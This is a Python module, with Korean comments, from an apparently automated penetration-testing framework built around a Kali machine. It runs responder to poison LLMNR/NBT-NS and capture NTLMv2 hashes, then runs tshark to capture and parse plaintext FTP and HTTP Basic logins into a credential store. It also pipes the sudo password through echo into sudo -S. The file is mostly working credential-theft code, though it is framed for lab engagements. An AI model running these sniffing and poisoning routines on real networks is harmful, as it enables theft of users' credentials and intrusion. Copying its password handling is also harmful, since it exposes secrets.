"""
네트워크 스니핑. DESIGN.md 8/8-1절. AD/멀티호스트 MVP 항목(미래 확장 아님).

리눅스 단일 박스에서는 스니핑할 트래픽이 거의 없어 의미가 적지만, AD/멀티호스트
환경에서는 초기 진입점을 여는 핵심 기법이다(익스플로잇 없이 "듣기만" 해도
크레덴셜을 얻는 경우가 흔함).

**미검증**: 이 랩에는 아직 AD 환경이 없어서 실전 테스트 전이다. responder/
tshark의 문서화된 표준 사용법을 근거로 작성했다 - AD 랩이 준비되면
post_exploit.py(DESIGN.md 21절)처럼 실측 검증할 것 (DESIGN.md 24절).

responder(LLMNR/NBT-NS 포이즈닝)와 tshark(평문 인증 캡처)는 **순차로** 돌린다
(동시 실행 안 함) - Kali 부하를 하나씩만 유지한다는 방침(사용자 피드백)을 이
모듈에도 그대로 적용했다. 실전에서 캡처 시간대를 맞추려고 둘을 동시에 돌리고
싶어지면, 그건 이 모듈의 기본 동작을 벗어나는 것이니 그때 사용자에게 명시적으로
확인받고 바꿀 것.
"""

import re
import time

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core.state_store import append_credential_discovered, append_finding
from env.guest_control import KALI_PASS, run_in_kali
from env.job_runner import kill_job, start_job, wait_for_job

RESPONDER_LOG_DIR = "/usr/share/responder/logs"
# responder/tshark 둘 다 root 권한이 필요한데, Kali의 sudo는 비밀번호를
# 요구한다(작성 당시엔 비번 없이 되는 줄 알았음 - AD 랩 실전 검증 중 발견,
# DESIGN.md 36절 근처 기록). `echo {KALI_PASS} | sudo -S`로 비대화형 전달.
_SUDO_PREFIX = f"echo {KALI_PASS} | sudo -S"


def sniff_llmnr_nbtns(engagement_id: str, interface: str, duration_sec: int = 300) -> list[dict]:
    """responder로 LLMNR/NBT-NS 포이즈닝 -> NTLMv2 해시 캡처. root 권한 필요(sudo).
    duration_sec 동안 돌리다가 강제 종료(responder는 스스로 안 끝남)."""
    job_id = f"sniff-responder-{interface}-{int(time.time())}"
    command = f"{_SUDO_PREFIX} timeout {duration_sec + 5} responder -I {interface} -w -v"
    handle = start_job(engagement_id, job_id, command)
    result = wait_for_job(engagement_id, handle, hard_timeout=duration_sec + 30)
    if not result.finished:
        kill_job(handle)

    log_check = run_in_kali(f"cat {RESPONDER_LOG_DIR}/*NTLMv2*.txt 2>/dev/null", timeout=15)
    hashes = _parse_responder_hashes(log_check.stdout)
    for h in hashes:
        append_credential_discovered(
            engagement_id, username=h["username"], secret=h["hash"], cred_type="ntlmv2_hash",
            source=f"sniffing:responder:{interface}", domain=h.get("domain"),
        )
    append_finding(
        engagement_id, stage="sniffing", event="responder_capture_done",
        target=interface, duration_sec=duration_sec, hashes_found=len(hashes),
    )
    return hashes


def _parse_responder_hashes(raw: str) -> list[dict]:
    """responder의 NTLMv2 로그 라인은 `user::DOMAIN:challenge:proof:blob` 형식.
    필드 하나하나 정확히 쪼개기보다, hashcat이 요구하는 전체 라인을 그대로
    secret으로 보존하고 username/domain만 앞부분에서 뽑아낸다(실전 검증 전이라
    필드 개수/구분자 미세한 차이에 안전하게 하기 위함)."""
    hashes, seen = [], set()
    for line in raw.splitlines():
        line = line.strip()
        if not line or "::" not in line or line in seen:
            continue
        seen.add(line)
        username, _, rest = line.partition("::")
        domain = rest.split(":", 1)[0] if ":" in rest else None
        hashes.append({"username": username, "domain": domain or None, "hash": line})
    return hashes


_FTP_USER_RE = re.compile(r'"USER"\s+"([^"]*)"')
_FTP_PASS_RE = re.compile(r'"PASS"\s+"([^"]*)"')


def sniff_plaintext_auth(engagement_id: str, interface: str, duration_sec: int = 300) -> list[dict]:
    """tshark로 트래픽을 pcap에 캡처한 뒤, FTP/HTTP Basic 평문 인증을 뽑아낸다.
    Telnet은 세션 단위 텍스트라 자동 파싱이 부정확할 수 있어(사용자 입력이
    문자 단위로 여러 패킷에 나뉨) 여기선 FTP/HTTP Basic만 구조화 파싱하고,
    Telnet 관련 패킷은 raw dump로만 findings에 남긴다."""
    pcap_path = f"/tmp/sniff-{int(time.time())}.pcap"
    job_id = f"sniff-tshark-{interface}-{int(time.time())}"
    capture_filter = "tcp port 21 or tcp port 23 or tcp port 80"
    command = f"{_SUDO_PREFIX} timeout {duration_sec + 5} tshark -i {interface} -w {pcap_path} -f '{capture_filter}'"
    handle = start_job(engagement_id, job_id, command)
    result = wait_for_job(engagement_id, handle, hard_timeout=duration_sec + 30)
    if not result.finished:
        kill_job(handle)

    creds: list[dict] = []
    ftp = run_in_kali(
        f"tshark -r {pcap_path} -Y 'ftp.request.command==\"USER\" or ftp.request.command==\"PASS\"' "
        "-T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null",
        timeout=30,
    )
    creds.extend(_parse_ftp_creds(ftp.stdout))

    http = run_in_kali(
        f"tshark -r {pcap_path} -Y 'http.authorization' -T fields -e ip.src -e http.authorization 2>/dev/null",
        timeout=30,
    )
    creds.extend(_parse_http_basic_creds(http.stdout))

    for c in creds:
        append_credential_discovered(
            engagement_id, username=c["username"], secret=c["secret"], cred_type="password",
            source=f"sniffing:tshark:{c['protocol']}",
        )
    append_finding(
        engagement_id, stage="sniffing", event="tshark_capture_done",
        target=interface, duration_sec=duration_sec, pcap_path=pcap_path, credentials_found=len(creds),
    )
    return creds


def _parse_ftp_creds(raw: str) -> list[dict]:
    """`-T fields`로 뽑은 `command\\targ` 탭 구분 라인을 순서대로 짝지어 USER/PASS
    쌍을 만든다. 같은 세션이라는 보장은 없어(여러 클라이언트가 섞이면 순서가
    꼬일 수 있음) - 최선 노력(best-effort) 파싱이라는 걸 findings에 원본과
    함께 남겨서 나중에 사람이 검증할 수 있게 한다."""
    pending_user = None
    creds = []
    for line in raw.splitlines():
        parts = line.strip().split("\t")
        if len(parts) != 2:
            continue
        cmd, arg = parts
        if cmd == "USER":
            pending_user = arg
        elif cmd == "PASS" and pending_user:
            creds.append({"username": pending_user, "secret": arg, "protocol": "ftp"})
            pending_user = None
    return creds


def _parse_http_basic_creds(raw: str) -> list[dict]:
    import base64

    creds = []
    for line in raw.splitlines():
        parts = line.strip().split("\t")
        if len(parts) != 2:
            continue
        _ip, auth_header = parts
        if not auth_header.lower().startswith("basic "):
            continue
        try:
            decoded = base64.b64decode(auth_header[6:].strip()).decode("utf-8", errors="replace")
            username, _, secret = decoded.partition(":")
            if username:
                creds.append({"username": username, "secret": secret, "protocol": "http_basic"})
        except (ValueError, UnicodeDecodeError):
            continue
    return creds


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("usage: python -m modules.sniffing <engagement_id> <interface> [duration_sec]")
        sys.exit(1)

    eid, iface = sys.argv[1], sys.argv[2]
    dur = int(sys.argv[3]) if len(sys.argv) > 3 else 300

    found = sniff_llmnr_nbtns(eid, iface, dur)
    print(f"NTLMv2 해시 {len(found)}개 캡처")
    for h in found:
        print("-", h["username"], h.get("domain"))
